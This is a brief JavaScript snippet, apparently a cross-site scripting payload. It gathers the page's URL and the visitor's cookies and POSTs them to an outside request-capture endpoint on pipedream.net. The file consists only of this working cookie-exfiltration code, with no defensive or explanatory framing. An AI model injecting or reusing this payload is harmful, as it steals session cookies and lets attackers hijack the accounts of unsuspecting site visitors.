  
const headers = new Headers();

const body = { "location": document.location.href, "cookie": document.cookie };

const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: JSON.stringify(body),
};

fetch("https://enrexmfxz9n1n.x.pipedream.net", options);
